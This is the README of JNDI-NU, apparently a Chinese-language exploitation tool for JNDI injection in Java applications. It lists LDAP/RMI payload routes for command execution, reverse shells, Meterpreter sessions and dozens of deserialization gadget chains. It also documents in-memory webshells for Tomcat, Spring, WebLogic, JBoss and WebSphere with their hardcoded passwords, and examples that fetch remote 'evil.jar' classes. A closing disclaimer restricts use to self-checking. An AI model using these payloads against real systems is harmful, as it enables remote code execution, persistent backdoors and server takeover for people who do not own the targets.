![JNDI-NU](https://socialify.git.ci/nu1r/JNDI-NU/image?description=1&descriptionEditable=%E4%B8%80%E6%AC%BE%E7%94%A8%E4%BA%8E%20JNDI%E6%B3%A8%E5%85%A5%20%E5%88%A9%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%EF%BC%8C%E9%80%82%E7%94%A8%E4%BA%8E%E4%B8%8E%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7%E9%85%8D%E5%90%88%E4%BD%BF%E7%94%A8&font=KoHo&forks=1&language=1&logo=https%3A%2F%2Fs1.328888.xyz%2F2022%2F08%2F02%2FOESvy.png&name=1&owner=1&pattern=Circuit%20Board&stargazers=1&theme=Light)

# 😈使用说明

使用 ```java -jar JNDI-NU.jar -h``` 查看参数说明，其中 ```--ip``` 参数为必选参数

```
Usage: java -jar JNDI-NU.jar [options]
  Options:
  * -i, --ip       Local ip address
    -rl, --rmiPort rmi bind port (default: 10990)
    -l, --ldapPort Ldap bind port (default: 1389)
    -p, --httpPort Http bind port (default: 8080)
    -c, --command  rmi gadgets System Command
    -py, --python  Python System Command ex: python3  python2 ...
    -u, --usage    Show usage (default: false)
    -h, --help     Show this help
```

~~使用 ```java -jar JNDI-NU.jar.jar -u``` 查看支持的 LDAP 格式~~(取消该帮助信息，有需要在此处看即可)
```
Supported LADP Queries：
* all words are case INSENSITIVE when send to ldap server

[+] Basic Queries: ldap://0.0.0.0:1389/Basic/[PayloadType]/[Params], e.g.
    ldap://0.0.0.0:1389/Basic/Dnslog/[domain]
    ldap://0.0.0.0:1389/Basic/Command/[cmd]
    ldap://0.0.0.0:1389/Basic/Command/Base64/[base64_encoded_cmd]
    ldap://0.0.0.0:1389/Basic/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://0.0.0.0:1389/Basic/TomcatEcho
    ldap://0.0.0.0:1389/Basic/SpringEcho
    ldap://0.0.0.0:1389/Basic/WeblogicEcho
    ldap://0.0.0.0:1389/Basic/JBossFilter
    ldap://0.0.0.0:1389/Basic/JBossServlet
    ldap://0.0.0.0:1389/Basic/JettyFilter
    ldap://0.0.0.0:1389/Basic/JettyServlet
    ldap://0.0.0.0:1389/Basic/TomcatFilterJmx
    ldap://0.0.0.0:1389/Basic/TomcatFilterTh
    ldap://0.0.0.0:1389/Basic/TomcatListenerJmx
    ldap://0.0.0.0:1389/Basic/TomcatListenerTh
    ldap://0.0.0.0:1389/Basic/TomcatServletJmx
    ldap://0.0.0.0:1389/Basic/TomcatServletTh
    ldap://0.0.0.0:1389/Basic/WSFilter
    ldap://0.0.0.0:1389/Basic/SpringInterceptor
    ldap://0.0.0.0:1389/Basic/WebsphereMemshell
    ldap://0.0.0.0:1389/Basic/WeblogicMemshell1
    ldap://0.0.0.0:1389/Basic/WeblogicMemshell2
    rmi://0.0.0.0:1099/Bypass

[+] Deserialize Queries: ldap://0.0.0.0:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.
    ldap://0.0.0.0:1389/Deserialization/URLDNS/[domain]
    ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]
    ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/Command/Base64/[base64_encoded_cmd]
    ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils2/TomcatEcho
    ldap://0.0.0.0:1389/Deserialization/C3P0/SpringEcho
    ldap://0.0.0.0:1389/Deserialization/Jdk7u21/WeblogicEcho
    ldap://0.0.0.0:1389/Deserialization/Jre8u20/TomcatMemshell
    ldap://0.0.0.0:1389/Deserialization/CVE_2020_2555/WeblogicMemshell1
    ldap://0.0.0.0:1389/Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells

[+] TomcatBypass Queries
    ldap://0.0.0.0:1389/TomcatBypass/Dnslog/[domain]
    ldap://0.0.0.0:1389/TomcatBypass/Command/[cmd]
    ldap://0.0.0.0:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]
    ldap://0.0.0.0:1389/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://0.0.0.0:1389/TomcatBypass/TomcatEcho
    ldap://0.0.0.0:1389/TomcatBypass/SpringEcho
    ldap://0.0.0.0:1389/TomcatBypass/SpringInterceptor
    ldap://0.0.0.0:1389/TomcatBypass/TomcatFilterJmx
    ldap://0.0.0.0:1389/TomcatBypass/TomcatFilterTh
    ldap://0.0.0.0:1389/TomcatBypass/TomcatListenerJmx
    ldap://0.0.0.0:1389/TomcatBypass/TomcatListenerTh
    ldap://0.0.0.0:1389/TomcatBypass/TomcatServletJmx
    ldap://0.0.0.0:1389/TomcatBypass/TomcatServletTh
    ldap://0.0.0.0:1389/TomcatBypass/JBossFilter
    ldap://0.0.0.0:1389/TomcatBypass/JBossServlet
    ldap://0.0.0.0:1389/TomcatBypass/JettyFilter
    ldap://0.0.0.0:1389/TomcatBypass/JettyServlet
    ldap://0.0.0.0:1389/TomcatBypass/WSFilter
    ldap://0.0.0.0:1389/TomcatBypass/weblogicmemshell1
    ldap://0.0.0.0:1389/TomcatBypass/weblogicmemshell2
    ldap://0.0.0.0:1389/TomcatBypass/webspherememshell
    ldap://0.0.0.0:1389/TomcatBypass/Meterpreter/[ip]/[port]  ---java/meterpreter/reverse_tcp

[+] GroovyBypass Queries
    ldap://0.0.0.0:1389/GroovyBypass/Command/[cmd]
    ldap://0.0.0.0:1389/GroovyBypass/Command/Base64/[base64_encoded_cmd]

[+] WebsphereBypass Queries
    ldap://0.0.0.0:1389/WebsphereBypass/List/file=[file or directory]
    ldap://0.0.0.0:1389/WebsphereBypass/Upload/Dnslog/[domain]
    ldap://0.0.0.0:1389/WebsphereBypass/Upload/Command/[cmd]
    ldap://0.0.0.0:1389/WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd]
    ldap://0.0.0.0:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://0.0.0.0:1389/WebsphereBypass/Upload/WebsphereMemshell
    ldap://0.0.0.0:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp
```
* 目前支持的所有 ```PayloadType``` 为
  * ```Dnslog```: 用于产生一个```DNS```请求，与 ```DNSLog```平台配合使用，对```Linux/Windows```进行了简单的适配
  * ```Command```: 用于执行命令，如果命令有特殊字符，支持对命令进行 ```Base64编码```后传输
  * ```ReverseShell```: 用于 ```Linux``` 系统的反弹shell，方便使用
  * ```Bypass```: 用于rmi本地工程类加载，通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
  * ```TomcatEcho```: 用于在中间件为 ```Tomcat``` 时命令执行结果的回显，通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
  * ```SpringEcho```: 用于在框架为 ```SpringMVC/SpringBoot``` 时命令执行结果的回显，通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
  * ```WeblogicEcho```: 用于在中间件为 ```Weblogic``` 时命令执行结果的回显，通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
* 内存马已适配冰蝎4.0,AES加密, 添加后访问```/nu1r```即可, 暂时只写了冰蝎4的shell
  - 前提条件：Referer: https://nu1r.cn/
  - 冰蝎4.0使用时，需要先设置key为 ```f90ec6fa47af4bda```
  - 支持引用类远程加载方式打入（Basic路由）
  - 支持本地工厂类方式打入 （TomcatBypass路由）
    * ```SpringInterceptor```: 向系统内植入 Spring Interceptor 类型的内存马
      * X-nu1r-TOKEN 如果为 ce 则执行命令 , ?X-Token-Data=cmd
      * X-nu1r-TOKEN 如果为 bx 则为冰蝎马   密码 nu1ryyds
      * X-nu1r-TOKEN 如果为 gz 则为哥斯拉马 pass nu1r key nu1ryyds 
    * ```WeblogicMemshell1```: 用于植入```Weblogic内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
    * ```WeblogicMemshell2```: 用于植入```Weblogic内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```，**推荐**使用此方式
    * ```JettyFilter```: 利用 JMX MBeans 向系统内植入 Jetty Filter 型内存马
    * ```JettyServlet```: 利用 JMX MBeans 向系统内植入 Jetty Servlet 型内存马
    * ```JBossFilter```: 通过全局上下文向系统内植入 JBoss/Wildfly Filter 型内存马
    * ```JBossServlet```: 通过全局上下文向系统内植入 JBoss/Wildfly Servlet 型内存马
    * ```WebsphereMemshell```: 用于植入```Websphere内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
    * ```tomcatFilterJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Filter 型内存马
    * ```tomcatFilterTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Filter 型内存马
    * ```TomcatListenerJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Listener 型内存马
    * ```TomcatListenerTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Listener 型内存马
    * ```TomcatServletJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Servlet 型内存马
    * ```TomcatServletTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Servlet 型内存马
    * ```WSFilter```: `CMD` 命令回显 WebSocket 内存马
    * ```TomcatExecutor``` : Executor 内存马，通过添加自定义```header``` ```nu1r: d2hvYW1p``` 的方式传递想要执行的命令，命令要进行Base64编码，需要Tomcat版本8.5+，因为tomcat8.5.0以后，在tomcat封装的socket⽀持unread的数据回写
* 目前支持的所有 ```GadgetType``` 为
  * ```URLDNS```
  * ```CommonsBeanutils1```  
  * ```CommonsBeanutils2```
  * ```CommonsBeanutils2NOCC```
  * ```CommonsBeanutils3```
  * ```CommonsBeanutils3183```
  * ```CommonsBeanutils1183NOCC```
  * ```CommonsCollections1```
  * ```CommonsCollections1_1```
  * ```CommonsCollections2```
  * ```CommonsCollections3```
  * ```CommonsCollections4```
  * ```CommonsCollections5```
  * ```CommonsCollections6```
  * ```CommonsCollections6Lite```
  * ```CommonsCollections6Lite_4```
  * ```CommonsCollections7```
  * ```CommonsCollections7Lite```
  * ```CommonsCollections8```
  * ```CommonsCollections9```
  * ```CommonsCollections10```
  * ```CommonsCollectionsK1```
  * ```CommonsCollectionsK2```
  * ```C3P0```
  * ```C3P02```
  * ```C3P03```
  * ```Jdk7u21```
  * ```Jre8u20```
  * ```CVE_2020_2551```
  * ```CVE_2020_2883```
  * ```AspectJWeaver```
  * ```BeanShell1```
  * ```C3P092```
  * ```Click1```
  * ```Clojure```
  * ```Jython1```
  * ```Json1```
  * ```Groovy1```
  * ```Hibernate1```
  * ```Hibernate2```
  * ```JavassistWeld1```
  * ```JBossInterceptors1```
  * ```Jdk7u21variant```
  * ```JRMPClient```
  * ```JRMPClient_Activator```
  * ```JRMPClient_Obj```
  * ```JRMPListener```
  * 使用示例：
  ```
  ldap://0.0.0.0:1389/Deserialization/[GadgetType]/Command/Base64/[base64_encoded_cmd]
  ```
* ```WebsphereBypass``` 中的 3 个动作：
  * ```list```：基于```XXE```查看目标服务器上的目录或文件内容
  * ```upload```：基于```XXE```的```jar协议```将恶意```jar包```上传至目标服务器的临时目录
  * ```rce```：加载已上传至目标服务器临时目录的```jar包```，从而达到远程代码执行的效果（这一步本地未复现成功，抛```java.lang.IllegalStateException: For application client runtime, the client factory execute on a managed server thread is not allowed.```异常，有复现成功的小伙伴麻烦指导下）

* ```Basic cmd shell``` 的访问方式为 ```/anything?type=basic&pass=[cmd]```


**MSF上线支持**

- 支持tomcatBypass路由直接上线msf：

```
  使用msf的java/meterpreter/reverse_tcp开启监听
  ldap://127.0.0.1:1389/TomcatBypass/Meterpreter/[msfip]/[msfport]
```
# 🐍Yakit一劳永逸的方便法子

先于热加载标签中插入代码

```go
jndiNu = func(Payload) {
    Command := str.Split(Payload,"#")
    cmd := codec.EncodeBase64(Command[1])
    Payload := str.Replace(Command[0],"CommandNew",cmd,1)
    return codec.EncodeUrl(Payload)
}
```

之后只需要改 GadgetType ，与Command即可

```{{yak(jndiNu|${jndi:ldap://0.0.0.0:1389/Deserialization/Groovy1/Command/Base64/CommandNew}#ping 123)}}```

![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown微信截图_20220803130851.png)

![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown微信截图_20220803131020.png)

---

# 其他利用链的拓展

对于 `BeanShell1` 及 `Clojure` 这两个基于脚本语言解析的漏利用方式。

本项目为这两条利用链拓展了除了 Runtime 执行命令意外的多种利用方式，具体如下：

`Base64/`后的内容需要base64编码

TS ：Thread Sleep - 通过 Thread.sleep() 的方式来检查是否存在反序列化漏洞，使用命令：TS-10
```
ldap://0.0.0.0:1389/Deserialization/Clojure/Command/Base64/TS-10
```

RC ：Remote Call - 通过 URLClassLoader.loadClass() 来调用远程恶意类并初始化，使用命令：RC-http://xxxx.com/evil.jar#EvilClass
```
ldap://0.0.0.0:1389/Deserialization/Clojure/Command/Base64/RC-http://xxxx.com/evil.jar#EvilClass
```

WF ：Write File - 通过 FileOutputStream.write() 来写入文件，使用命令：WF-/tmp/shell#123
```
ldap://0.0.0.0:1389/Deserialization/Clojure/Command/Base64/WF-/tmp/shell#123
```

其他：普通命令执行 - 通过 ProcessBuilder().start() 执行系统命令，使用命令 whoami
```
ldap://0.0.0.0:1389/Deserialization/Clojure/Command/Base64/whoami
```

---

# C3P04的使用

* 远程加载 Jar 包
  * C3P04 'remoteJar-http://1.1.1.1.com/1.jar'
* 向服务器写入 Jar 包并加载（不出网）
  * C3P04 'writeJar-/tmp/evil.jar:./yaml.jar'
  * C3P04 'localJar-./yaml.jar'
* C3P0 二次反序列化
  * C3P04 'c3p0Double-/usr/CC6.ser'

```
ldap://0.0.0.0:1389/Deserialization/C3P04/Command/Base64/[base64_encoded_cmd]
```
---

# SignedObject 二次反序列化 Gadget

用来进行某些场景的绕过（常见如 TemplatesImpl 黑名单，CTF 中常出现的 CC 无数组加黑名单等）

利用链需要调用 SignedObject 的 getObject 方法，因此需要可以调用任意方法、或调用指定类 getter 方法的触发点；

大概包含如下几种可用的常见调用链：
1. InvokerTransformer 调用任意方法（依赖 CC）
2. BeanComparator 调用 getter 方法（依赖 CB）
3. BasicPropertyAccessor$BasicGetter 调用 getter 方法(依赖 Hibernate)
4. MemberBox 反射调用任意方法（依赖 rhino）
5. ToStringBean 调用全部 getter 方法（依赖 Rome）
6. MethodInvokeTypeProvider 反射调用任意方法（依赖 spring-core）

* 利用方式：
* SignedObjectPayload -> 'CC:CommonsCollections6:b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==:10000' 20000
```
ldap://0.0.0.0:1389/Deserialization/SignedObject/Command/Base64/[base64_encoded_SignedObjectPayload]
```
---

# 🏓TODO

1. 本地ClassPath反序列化漏洞利用方式
2. 支持自定义内存马密码

---

# 👮免责声明

该工具仅用于安全自查检测

由于传播、利用此工具所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。

本人拥有对此工具的修改和解释权。未经网络安全部门及相关部门允许，不得善自使用本工具进行任何攻击活动，不得以任何方式将其用于商业目的。

# 🐲建议
本项目用JDK1.8.0_332开发，不推荐用高于11的JDK，可能会出现错误

# 📷参考
 * https://github.com/veracode-research/rogue-jndi
 * https://github.com/welk1n/JNDI-Injection-Exploit
 * https://github.com/welk1n/JNDI-Injection-Bypass
 * https://github.com/WhiteHSBG/JNDIExploit
 * https://github.com/su18/ysoserial
